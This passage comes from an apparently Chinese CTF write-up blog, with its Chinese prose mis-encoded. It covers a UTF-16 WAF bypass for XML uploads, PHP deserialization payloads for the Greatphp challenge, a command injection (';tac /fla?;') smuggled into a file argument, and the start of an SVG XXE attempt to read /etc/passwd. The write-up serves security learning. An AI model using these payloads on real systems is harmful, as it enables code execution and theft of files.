class="hljs-number">124481254</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚</p><p>åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†</p></blockquote><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">iconv <span class="hljs-params">-f</span> utf8 <span class="hljs-params">-t</span> utf16 <span class="hljs-number">333.</span><span class="hljs-built_in">xml</span>&gt;<span class="hljs-number">1231.</span><span class="hljs-built_in">xml</span><br><span class="hljs-params">-f</span> æŒ‡å®šå¾…è½¬æ¢æ–‡ä»¶çš„ç¼–ç <br><span class="hljs-params">-t</span> åˆ¶å®šç›®æ ‡ç¼–ç <br>&gt; å°†<span class="hljs-number">1.</span><span class="hljs-built_in">xml</span>æ–‡æ¡£è½¬ç åçš„ç»“æœä¿å­˜åˆ°<span class="hljs-number">1231.</span><span class="hljs-built_in">xml</span>æ–‡ä»¶ä¸­<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ä¸Šä¼ å°±è¡Œã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>md5</code>å’Œ<code>sha1</code>å¼ºç›¸ç­‰ç”¨æ•°ç»„ç»•è¿‡å°±è¡Œã€‚ã€‚ä½†åé¢ç›´æ¥æ‰§è¡Œäº†<code>$syc</code>?è¿˜æ˜¯åœ¨ç±»é‡Œã€‚è¿™ç§æƒ…å†µå¥½åƒä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡äº†</p><p>å‚è€ƒ<code>https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/</code></p><p><code>md5()</code>å’Œ<code>sha1()</code>å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ <code>__toString</code> æ–¹æ³•ï¼›ä¸”å½“<code>eval()</code>å‡½æ•°ä¼ å…¥ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„ <code>__toString</code> æ–¹æ³•ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å«æœ‰ <code>__toString</code> æ–¹æ³•çš„PHPå†…ç½®ç±»æ¥ç»•è¿‡ï¼Œç”¨çš„ä¸¤ä¸ªæ¯”è¾ƒå¤šçš„å†…ç½®ç±»å°±æ˜¯ <code>Exception</code> å’Œ <code>Error</code> ï¼Œä»–ä»¬ä¹‹ä¸­æœ‰ä¸€ä¸ª <code>__toString</code> æ–¹æ³•ï¼Œå½“ç±»è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//ç»“æœ</span><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬èƒ½æ§åˆ¶çš„<code>payload</code>è¢«è¾“å‡ºäº†ï¼Œç„¶åæƒ³åŠæ³•å’Œ<code>eval</code>é…åˆå°±å¯ä»¥æ‰§è¡ŒæŸäº›æ¶æ„ä»£ç ã€‚å½“ç„¶ï¼Œæ•´ä¸ªè¾“å‡ºé‡Œæœ‰äº›æˆ‘ä»¬ä¸éœ€è¦çš„ä¸œè¥¿ï¼šæ¯”å¦‚å‰é¢çš„<code>Error</code>å’Œåé¢çš„<code>in /box/script.php:2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å‚è€ƒäº†boogipopå¸ˆå‚…çš„æ–‡ç« </span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;abc:echo 123;&quot;</span>);  <span class="hljs-comment">//123</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;abc12:echo 123;&quot;</span>); <span class="hljs-comment">//123</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;12a:echo 123;&quot;</span>); <span class="hljs-comment">//æŠ¥é”™ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;_12a:echo 123;&quot;</span>);<span class="hljs-comment">//123</span><br><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœå‰é¢æœ‰å†’å·çš„è¯ï¼Œåªè¦<strong>å†’å·å‰çš„å­—ç¬¦ä¸²æ˜¯è§„èŒƒçš„å˜é‡å</strong>é‚£ä¹ˆå°±ä¸ä¼šæŠ¥é”™ã€‚é‚£ä¹ˆå¯¹äº<code>Error: payload in /box/script.php:2</code>è¿™ä¸œè¥¿ï¼Œ<code>Error: </code>æ²¡èµ·å•¥ä½œç”¨ã€‚è‡³äº<code>payload</code>åé¢æ²¡æœ‰ç”¨çš„éƒ¨åˆ†ç›´æ¥ç”¨<code>?&gt;</code>é—­åˆå°±è¡Œã€‚</p><p>æ¯”å¦‚å¯¹äºè¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;echo 123;?&gt; echo 456;&#x27;</span>;<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœ 123 echo 456;</span><br></code></pre></td></tr></table></figure><p>å…ˆæ‰§è¡Œ<code>echo 123;</code>ï¼Œç„¶å<code>?&gt;</code>æ ‡è®°PHPä»£ç å—ç»“æŸã€‚<code>echo 456;</code>ç›´æ¥è¢«å½“æˆæ™®é€šæ–‡æœ¬è¾“å‡ºã€‚</p><p>æœ‰äº›å¸ˆå‚…ä¹Ÿç”¨è¿™ç§æ–¹æ³•å»é—­åˆï¼š<code>?&gt;&lt;?php payload ?&gt;</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;include $_GET[1];?&gt;&#x27;</span>;<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªå†™æ³•ï¼</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-number">1</span>); <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$o</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$o</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$o</span>));<br><span class="hljs-comment">//ç„¶ååŠ ä¸ª&amp;1=/flagå°±è¡Œ</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ³¨æ„é‚£ä¸¤ä¸ª<code>Error</code>ä¸€å®šè¦å†™åœ¨åŒä¸€è¡Œä¸Š(å› ä¸ºæŠ¥é”™ä¿¡æ¯é‡Œä¼šæ˜¾ç¤ºè¡Œå·ï¼Œæ¢äº†è¡ŒæŠ¥é”™ä¿¡æ¯å°±ä¸ä¸€æ ·äº†)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-number">2</span>);<span class="hljs-comment">//æ³¨æ„è¿™é‡Œéœ€è¦å†™åœ¨ä¸€è¡Œä¸Š</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5ç›¸ç­‰&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1ç›¸ç­‰&quot;</span>;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;Error: payload in /box/script.php:2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;a!=b</span><br>md5ç›¸ç­‰<br>sha1ç›¸ç­‰<br><span class="hljs-comment">//test</span><br><span class="hljs-comment">//æŠŠ$a $bæ”¾åœ¨ä¸¤è¡Œï¼š</span><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;Error: payload in /box/script.php:3</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;a!=b</span><br></code></pre></td></tr></table></figure><p>æœ‰äº›å¸ˆå‚…ç”¨çš„å–åæ–¹æ³•ç»•è¿‡æ­£åˆ™ï¼Œè¿™æ ·çš„è¯å¯ä»¥ç›´æ¥åŒ…å«<code>/flag</code>æ–‡ä»¶ï¼š</p><p>è¿™ä¹ˆæ“ä½œç›¸å½“äº<code>include &#39;/flag&#39;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover))) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>)) &#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include ~&quot;</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥è¿™ç§æ–¹æ³•å‡ºä¸æ¥ç»“æœã€‚ã€‚ã€‚ </p><h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm1&#x27;</span>];<br><span class="hljs-variable">$comm2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm2&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm1</span>))<br>    <span class="hljs-variable">$comm1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm2</span>))<br>    <span class="hljs-variable">$comm2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;#flag in /flag&quot;</span>;<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm1</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$comm2</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm2</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;file <span class="hljs-subst">$comm1</span> <span class="hljs-subst">$comm2</span>&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>system(â€˜file &quot;$com1&quot; &quot;$com2&quot; â€™);</code></p><p>system(â€˜file â€œ<code>&quot;;tac /fla?;&quot;</code>â€œ â€œcom2â€â€™);</p><p><code>?comm1=&quot;;tac /fla?;&quot;&amp;comm2=1</code></p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p><img src="/img/svgmagic1.png" alt="svgmagic1"></p><p>å³é”®çœ‹çœ‹é¡µé¢æºç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SVG Magic Test System<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Convert SVG to PNG with Magic<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/render&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;svgfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Render&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æŸ¥äº†ä¸‹SVGæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼š</p><p><img src="/img/svgmagic2.png" alt="svgmagic2"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿æ˜¯åŸºäº<code>XML</code>çš„å›¾å½¢æ–‡ä»¶æ ¼å¼ï¼Œæƒ³åˆ°å¯èƒ½å­˜åœ¨<code>XXE</code>ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">//examle.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">rect</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;red&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ç„¶åæŠ“åŒ…ï¼š</p><p><img src="/img/svgmagic3.png" alt="svgmagic3"></p><p>åé¢æƒ³ç€æŠŠ<code>svg</code>æ–‡ä»¶æ”¹æˆè¿™ç§æ ¼å¼å°è¯•è¯»<code>/etc/passwd</code>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span 